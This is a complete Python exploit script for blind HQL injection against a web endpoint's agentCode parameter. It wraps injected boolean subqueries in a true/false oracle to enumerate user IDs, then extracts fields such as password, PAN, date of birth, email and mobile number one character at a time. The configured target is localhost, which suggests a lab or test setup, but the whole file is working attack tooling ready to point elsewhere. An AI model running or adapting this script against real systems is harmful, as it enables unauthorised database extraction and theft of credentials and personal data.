#!/usr/bin/env python3
import requests, urllib3, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =======================
# CONFIG (edit these)
# =======================
URL = "http://localhost:8443/checkvalidagent"  # GET endpoint that accepts ?agentCode=
VERIFY_TLS = False
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # set None to disable
HEADERS = {}  # extra headers if needed

HQL_ENTITY = "com.pdstat.hqli.entity.User1"  # entity FQN seen in errors

# Phase 1: userId discovery
TARGET_USER_COUNT = 2
USERID_MAXLEN = 8
USERID_CHARSET = "0123456789"  # observed

# Phase 2: fields to try per user
FIELDS = [
    "altUserId", "pan", "dob", "emailId",
    "firstName", "password", "name",
    "mobile", "phone", "status"
]
DEFAULT_MAXLEN = 80
FIELD_MAXLEN = {
}

# Phase 3: value brute charset
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- @:/()[]+,"
SLEEP_BETWEEN = 0.0  # throttle if needed

# =======================
# Core utils
# =======================
def esc(s: str) -> str:
    return s.replace("'", "''")

def inj(expr: str) -> str:
    # Boolean oracle wrapper
    return f"0' or ({expr}) or '1'='2"

def exists(hql_bool: str) -> str:
    return f"exists ( from {HQL_ENTITY} u where {hql_bool} )"

def do_request(agent: str):
    params = {"agentCode": agent}
    r = requests.get(URL, params=params, headers=HEADERS,
                     timeout=20, verify=VERIFY_TLS, proxies=PROXY)
    try:
        j = r.json()
    except Exception:
        print(f"[!] Non-JSON response: {r.status_code} {r.text}")
        return None
    mi = j.get("msgInfo") or {}
    sc = str(mi.get("statusCode") or "")
    msg = mi.get("message") or ""
    print(f"[req] agentCode={agent!r} -> statusCode={sc}, message={msg}")
    if SLEEP_BETWEEN:
        time.sleep(SLEEP_BETWEEN)
    return j

def truthy(agent: str):
    j = do_request(agent)
    if not j: return None
    mi = j.get("msgInfo") or {}
    sc = str(mi.get("statusCode") or "")
    payload = j.get("payload") or {}
    if sc == "400" or payload.get("statusMsg") == "Agent Already Registered":
        return True
    if sc == "401":
        return False
    return None

def oracle_ok() -> bool:
    t_false = truthy(inj(exists("1=0")))
    t_true  = truthy(inj(exists("1=1")))
    ok = (t_false is False and t_true is True)
    print("[*] probe:", "ok" if ok else "odd (continuing)")
    return ok

# =======================
# Phase 1: enumerate userIds
# =======================
def prefix_is_user(prefix: str, extra_where: str = "1=1"):
    return truthy(inj(exists(f"{extra_where} and u.userId like '{esc(prefix)}%'")))

def recover_one_userid(extra_where: str = "1=1") -> str | None:
    # ensure any row is visible under this filter
    if truthy(inj(exists(extra_where))) is not True:
        return None
    prefix = ""
    for pos in range(1, USERID_MAXLEN + 1):
        advanced = False
        for c in USERID_CHARSET:
            if prefix_is_user(prefix + c, extra_where):
                prefix += c
                print(f"[userId] pos {pos:02d}: {prefix}")
                advanced = True
                break
        if not advanced:
            break
    return prefix if prefix else None

def enumerate_userids(target_count: int) -> list[str]:
    found: list[str] = []
    extra = "1=1"
    while len(found) < target_count:
        uid = recover_one_userid(extra_where=extra)
        if not uid:
            break
        print(f"[result] userId: {uid}")
        found.append(uid)
        # Exclude recovered IDs to get the next
        not_equals = " and ".join([f"u.userId <> '{esc(x)}'" for x in found])
        extra = f"({not_equals})"
    print(f"[done] recovered {len(found)} userId(s): {found}")
    return found

# =======================
# Phase 2–3: fields & values
# =======================
def field_not_null(user_id: str, field: str):
    where = f"u.userId = '{esc(user_id)}' and u.{field} is not null"
    return truthy(inj(exists(where)))

def has_len_at_least(user_id: str, field: str, n: int):
    where = f"u.userId = '{esc(user_id)}' and u.{field} is not null and length(u.{field}) >= {n}"
    return truthy(inj(exists(where)))

def prefix_is(user_id: str, field: str, prefix: str):
    where = f"u.userId = '{esc(user_id)}' and u.{field} like '{esc(prefix)}%'"
    return truthy(inj(exists(where)))

def recover_field(user_id: str, field: str, maxlen: int) -> str | None:
    present = field_not_null(user_id, field)
    if present is not True:
        print(f"[i] {field} is null/absent for {user_id}")
        return None

    # length bound
    length = 0
    for k in range(1, maxlen + 1):
        t = has_len_at_least(user_id, field, k)
        if t is True:  length = k
        elif t is False: break
        else: break

    if length == 0:
        print(f"[i] {field} length=0 for {user_id}")
        return ""

    # brute prefix
    val = ""
    for pos in range(1, length + 1):
        advanced = False
        for c in CHARSET:
            if prefix_is(user_id, field, val + c):
                val += c
                print(f"[+] {user_id} :: {field} pos {pos:02d}: {val!r}")
                advanced = True
                break
        if not advanced:
            print(f"[!] stalled at pos {pos} for {field} on {user_id}; widen CHARSET")
            break
    return val

def discover_and_dump_fields(user_ids: list[str]):
    results = []
    for uid in user_ids:
        print(f"\n===== Enumerating fields for userId {uid} =====")
        for field in FIELDS:
            maxlen = FIELD_MAXLEN.get(field, DEFAULT_MAXLEN)
            value = recover_field(uid, field, maxlen)
            if value is not None:
                print(f"[result] {uid} :: {field} = {repr(value)}")
                results.append((uid, field, value))
    print("\n=== OVERALL RESULTS ===")
    for uid, field, value in results:
        print(f"{uid} :: {field} = {repr(value)}")
    return results

# =======================
# Main
# =======================
def main():
    oracle_ok()
    user_ids = enumerate_userids(TARGET_USER_COUNT)
    if not user_ids:
        # Seed with known ones if discovery yields none
        # user_ids = ["60002650", "60002925", "60003197"]
        pass
    if user_ids:
        discover_and_dump_fields(user_ids)
    else:
        print("[i] No userIds available for field enumeration")

if __name__ == "__main__":
    main()
